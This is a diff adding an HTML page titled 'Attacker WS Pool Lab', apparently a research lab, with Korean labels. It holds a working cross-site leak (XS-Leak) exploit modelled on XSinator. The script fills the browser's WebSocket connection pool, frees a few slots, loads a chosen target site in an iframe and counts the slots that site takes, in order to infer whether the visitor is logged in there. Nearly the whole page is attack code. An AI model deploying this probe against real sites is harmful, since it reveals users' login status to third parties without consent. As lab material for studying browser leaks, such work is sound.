@@ -1,0 +1,185 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Attacker WS Pool Lab</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      margin: 28px;
+      line-height: 1.5;
+      color: #111827;
+      background: #f8fafc;
+    }
+
+    main {
+      max-width: 960px;
+      margin: 0 auto;
+      background: #ffffff;
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      padding: 24px;
+      box-shadow: 0 8px 30px rgba(15, 23, 42, 0.06);
+    }
+
+    .panel {
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      padding: 12px;
+      background: #f8fafc;
+      margin: 12px 0;
+    }
+
+    button {
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      background: #ffffff;
+      padding: 8px 12px;
+      cursor: pointer;
+      margin-right: 8px;
+    }
+
+    button:hover {
+      background: #f1f5f9;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Attacker 페이지: WebSocket API XS-Leak (단순 버전)</h1>
+
+    <div class="panel">
+      <p>선택한 타깃 워크스페이스를 iframe으로 열고, WebSocket 슬롯 차이를 관찰합니다.</p>
+      <p>payload는 XSinator 형태를 최대한 유지했습니다.</p>
+    </div>
+
+    <p>
+      <label for="target">타깃 워크스페이스:</label>
+      <select id="target">__TARGET_OPTIONS__</select>
+    </p>
+
+    <p>
+      <button id="detect">탐지 실행</button>
+      <button id="clear">로그 지우기</button>
+    </p>
+
+    <iframe
+      id="target-frame"
+      name="WW"
+      style="width: 100%; min-height: 220px; border: 1px solid #cbd5e1;"
+    ></iframe>
+    <pre id="log" class="panel" style="white-space: pre-wrap; min-height: 220px;"></pre>
+  </main>
+
+  <script>
+    let SOCKETS = [];
+
+    const sleep = (ms) => {
+      return new Promise((resolve) => setTimeout(resolve, ms));
+    };
+
+    const exaustWsLimit = (ws, limit) => {
+      for (let id = 0; id < limit; id += 1) {
+        const s = new WebSocket(ws);
+        s.onerror = () => {
+          SOCKETS = SOCKETS.filter((x) => x !== s);
+        };
+        s.onclose = () => {
+          SOCKETS = SOCKETS.filter((x) => x !== s);
+        };
+        SOCKETS.push(s);
+      }
+    };
+
+    const killSockets = (n = 10) => {
+      for (let id = 0; id < n; id += 1) {
+        const s = SOCKETS.shift();
+        if (!s) {
+          break;
+        }
+        try {
+          s.close();
+        } catch (error) {
+          // ignore
+        }
+      }
+    };
+
+    const closeAllWs = () => {
+      for (const s of SOCKETS) {
+        try {
+          s.close();
+        } catch (error) {
+          // ignore
+        }
+      }
+      SOCKETS = [];
+    };
+
+    const output = document.getElementById('log');
+    const targetFrame = document.getElementById('target-frame');
+
+    function log(line) {
+      output.textContent += '[' + new Date().toLocaleTimeString() + '] ' + line + '\n';
+      output.scrollTop = output.scrollHeight;
+    }
+
+    const leak = async (url, waitTime = 3000, max = 200) => {
+      const ws = `ws://${location.host}/attack-ws`; // attacker-controlled ws endpoint
+
+      log('ws endpoint: ' + ws);
+      log('[ ] Exhausting ws connections ...')
+      exaustWsLimit(ws, max);
+      await sleep(500);
+
+      const pageWsLimit = SOCKETS.length;
+      log('[*] Measured current limit for ws connection count: ' + pageWsLimit);
+
+      log('[ ] Making 10 empty rooms for new ws connection...')
+      killSockets(10);
+      await sleep(500);
+
+      log(`[ ] Loading cross-site target with iframe... (wait: ${waitTime}ms)`)
+      window.WW.location = url;
+      await sleep(waitTime);
+
+      log('[ ] Exhausting ws connections...')
+      exaustWsLimit(ws, 10);
+      await sleep(400);
+
+      const res = pageWsLimit - SOCKETS.length;
+      log(`[*] Reached measured socket limit? -> ${res > 0 ? 'X' : 'O'} (limit=${pageWsLimit} filled=${SOCKETS.length})`)
+
+      log('[ ] Cleaning up...')
+      closeAllWs();
+      window.WW.location = 'about:blank';
+      await sleep(300);
+
+      return res;
+    };
+
+    async function runLeak() {
+      const baseUrl = document.getElementById('target').value;
+      const url = baseUrl + '?ts=' + Date.now();
+      log('target: ' + url);
+
+      const res = await leak(url);
+
+      if (res > 0) {
+        log('probe=MISSING -> target 이 ws 사용 중으로 추정(로그인 추정)\n');
+      } else {
+        log('probe=OPEN -> target 이 ws 미사용 중으로 추정(로그아웃 추정)\n');
+      }
+    }
+
+    document.getElementById('detect').addEventListener('click', () => {
+      runLeak().catch((error) => log('detect error: ' + error.message));
+    });
+
+    document.getElementById('clear').addEventListener('click', () => {
+      output.textContent = '';
+    });
+  </script>
+</body>
+</html>
